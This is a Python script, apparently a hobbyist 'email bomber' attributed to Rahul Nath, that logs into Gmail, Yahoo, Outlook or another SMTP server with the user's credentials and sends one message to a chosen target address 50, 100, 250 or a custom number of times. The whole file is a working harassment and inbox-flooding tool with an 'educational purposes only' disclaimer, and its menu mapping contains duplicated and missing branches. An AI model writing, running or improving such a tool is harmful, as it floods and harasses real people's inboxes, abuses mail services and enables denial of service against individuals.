import os
import smtplib
import sys
from tqdm import tqdm


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = "\033[35m"
    BOLD = "\033[1m"


def banner():
  
    print( bcolors.BOLD + bcolors.CYAN + '''
                       _______  ____            
                      /::::::::\    \     
                     /:::/~~\:::\    \    
                    /:::/    \:::\    \   
                   /:::/    / \:::\    \  
                  /:::/____/   \:::\____\ 
                 |:::|    |     |:::|    | 
           ______     ______    ___  ___   ______   
          |   _  \   /  __  \  |   \/   | |   _  \                         
          |  |_)  | |  |  |  | |  \  /  | |  |_)  | 
          |   _  <  |  |  |  | |  |\/|  | |   _  <           
          |  |_)  | |  `--'  | |  |  |  | |  |_)  | 
          |______/   \______/  |__|  |__| |______/    

                 |:::|____|     |:::|    |
                  \:::\    \   /:::/    / 
                   \:::\    \ /:::/    /  
                    \:::\    /:::/    /   
                     \:::\__/:::/    /    
                      \::::::::/____/     
            
   _____________________________________________________
   |                                                   |
   |                  By : RAHUL NATH                  |
   |___________________________________________________|
                        
''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n----------Welcome to BomB----------'.center(os.get_terminal_size().columns))
            print(bcolors.RED + '\n----------Note: Please use this scrypt for educational purposes only----------')
            '''print(bcolors.RED + '\n----------If anything wrong happens, you''re responsible for that----------')'''
            self.target = str(input(bcolors.GREEN + '\n -----> Enter the target email <: '))
            
            self.mode = int(input(bcolors.GREEN + '\n -----> Enter the number of bombs to do on the targeted device \n -----> 1:(50) \n -----> 2:(100) \n -----> 3:(250) \n -----> 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('\n ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            
            self.amount = None
            if self.mode == int(1):
                self.amount = int(50)
            elif self.mode == int(2):
                self.amount = int(100)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + '\n -----> Choose a Custom amount <: '))
            print(bcolors.RED + '\n----------Setting up BomB----------')
            
            print(bcolors.RED + f'\n----------You have selected BomB mode {self.mode} and number of email: {self.amount} ----------')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n----------Setting up email----------')
            self.server = str(input(bcolors.GREEN + '\n -----> Enter email server | or select premade options :-\n -----> 1 : Gmail \n -----> 2 : Yahoo \n -----> 3 : Outlook \n -----> 4 : Office 365 \n -----> 5 : Hotmail \n -----> 6 : Verzion \n -----> 7 : Mail \n -----> 8 : Zoho Mail \n -----> 9 : GMX \n -----> 10 : Custom <: '))
            premade = ['1', '2', '3','4','5','6','7','8','9','10']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + '\n -----> Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'

            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'

            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            elif self.server == '4':
                self.server = 'smtp.office365.com'
            
            elif self.server == '5':
                self.server = 'smtp.live.com'
            
            elif self.server == '6':
                self.server = 'outgoing.verizon.net'
            
            elif self.server == '8':
                self.server = 'smtp.mail.com'
            
            elif self.server == '3':
                self.server = 'smtp.zoho.com'
            
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
 
            print(bcolors.RED + '\n----------Please enter the Sender Details----------')
            self.fromAddr = str(input(bcolors.GREEN + '\n -----> Enter email address <: '))
            self.fromPwd = str(input(bcolors.GREEN + '\n -----> Enter email password <: '))
            self.subject = str(input(bcolors.GREEN + '\n -----> Enter subject <: '))
            self.message = str(input(bcolors.GREEN + '\n -----> Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n----------Attacking...')
        
        for email in range(self.amount+1):
            self.send()
        self.s.close()

        x=1
        for i in tqdm(range(0,20000)):
            for x in range(0,10000):
                x*=4

        print(bcolors.RED + '\n-----------Attack Done----------')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()